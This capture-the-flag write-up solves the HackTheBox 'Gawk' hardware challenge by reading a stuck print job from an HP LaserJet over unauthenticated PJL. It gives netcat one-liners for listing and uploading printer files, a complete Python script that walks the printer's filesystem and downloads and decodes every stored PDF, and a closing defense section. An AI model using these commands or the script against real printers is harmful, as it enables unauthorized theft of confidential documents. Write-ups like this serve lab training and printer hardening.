## Overview

`Gawk` is a Very Easy HackTheBox **Hardware** challenge. The premise: *"I lost access to my computer and need a document urgently which got stuck in a printer."* The target is an HP LaserJet speaking **PJL (Printer Job Language)** on a raw TCP port. PJL ships a small [filesystem that anyone who can reach the port may read](https://cwe.mitre.org/data/definitions/552.html) — no authentication. The whole solve is: confirm it's a PJL printer, list its filesystem, pull the stuck print job, and decode it.

## The technique

Real office printers expose PJL for management. Every PJL command is wrapped in the **UEL** ("Universal Exit Language") escape `\x1b%-12345X`, and the filesystem verbs — `FSDIRLIST` (list), `FSUPLOAD` (read), `FSDOWNLOAD` (write) — have **no access control**. That makes any stored print job readable by an unauthenticated client. This is the manual core of the **PRET** (Printer Exploitation Toolkit) attack; knowing the raw lines means you can exploit the device over any transport, even where PRET can't attach.

## Solution

**Confirm the device.** Ask the printer to identify itself:

```bash
printf '\x1b%-12345X@PJL INFO ID\r\n\x1b%-12345X\r\n' | nc <target> <port>
```

It answers `hp LaserJet 4200` — a PJL printer.

**List the filesystem.** Use forward slashes (`0:/`); the backslash form `0:\` returns `FILEERROR=3`. Recursing from the root volume reveals the saved-jobs store:

```bash
printf '\x1b%-12345X@PJL FSDIRLIST NAME="0:/saveDevice/SavedJobs/InProgress" ENTRY=1 COUNT=99999\r\n\x1b%-12345X\r\n' | nc <target> <port>
```

The stuck document is sitting right there in the printer's **own** volume — no path traversal needed:

```
0:/saveDevice/SavedJobs/InProgress/HR_Policies.pdf   FILE SIZE=41893
```

**Read it off the device** with `FSUPLOAD` (`SIZE` can overshoot — the printer caps it):

```bash
printf '\x1b%-12345X@PJL FSUPLOAD NAME="0:/saveDevice/SavedJobs/InProgress/HR_Policies.pdf" OFFSET=0 SIZE=2000000\r\n\x1b%-12345X\r\n' | nc <target> <port>
```

The reply is framed — an echoed header line, then the file body, then a trailing UEL — and the body turns out to be **base64** (`JVBERi0xLjQK` = `%PDF-1.4`). The full solve script handles the enumeration, the upload, and the decode in one pass:

Create `solve.py`:

```python
#!/usr/bin/env python3
import socket, time, sys, os, base64

HOST = sys.argv[1]
PORT = int(sys.argv[2])
UEL = b"\x1b%-12345X"

def cmd(c, settle=1.2):
    for _ in range(4):
        try:
            s = socket.socket(); s.settimeout(8); s.connect((HOST, PORT))
            s.sendall(UEL + c + b"\r\n" + UEL)
            time.sleep(settle); s.settimeout(3); data = b""
            try:
                while True:
                    d = s.recv(8192)
                    if not d: break
                    data += d
            except socket.timeout:
                pass
            s.close(); return data
        except Exception:
            time.sleep(1.5)
    return b""

def fsdirlist(path):
    r = cmd(b'@PJL FSDIRLIST NAME="%s" ENTRY=1 COUNT=99999' % path.encode()).decode("latin1")
    dirs, files = [], []
    for line in r.split("\r\n"):
        line = line.strip()
        if " TYPE=" not in line: continue
        name, typ = line.rsplit(" TYPE=", 1); name = name.strip()
        if name in (".", ".."): continue
        full = path.rstrip("/") + "/" + name
        (dirs if typ.startswith("DIR") else files).append(full)
    return dirs, files

seen, all_files = set(), []
def walk(path, depth=0):
    if path in seen or depth > 6: return
    seen.add(path)
    dirs, files = fsdirlist(path)
    all_files.extend(files)
    for d in dirs: walk(d, depth + 1)

print("[*] INFO ID:", cmd(b'@PJL INFO ID').decode("latin1").strip())
walk("0:/")
for f in all_files:
    if not f.lower().endswith(".pdf"): continue
    raw = cmd(b'@PJL FSUPLOAD NAME="%s" OFFSET=0 SIZE=2000000' % f.encode(), settle=2.0)
    body = raw.split(b"\r\n", 1)[1].split(b"\x1b")[0].strip()
    pdf = base64.b64decode(body)
    out = os.path.basename(f)
    open(out, "wb").write(pdf)
    print("[+] recovered %s (%d bytes)" % (out, len(pdf)))
```

Then decode and read the document:

```bash
python3 solve.py <target> <port>
pdftotext HR_Policies.pdf - | grep -oiE 'HTB\{[^}]*\}'
```

The flag is printed inside the recovered PDF body: `HTB{...}`.

## Why it worked

PJL's filesystem verbs ship with **no authentication and no access control**. Anyone who can reach the printer's port can enumerate and read every stored job — which routinely holds confidential documents (and, in other challenges, device unlock PINs via `@PJL SET HOLDKEY`). The "stuck" document never left the device; it sat in the spool waiting to be read by an unauthenticated client.

## Fix / defense

- Disable the PJL filesystem / job storage, or require authentication for device management.
- Segment printers off the user network; never expose port 9100 / PJL to untrusted hosts.
- Don't leave sensitive documents — or secrets in `@PJL SET HOLDKEY` / `@PJL COMMENT` metadata — sitting in the spool.
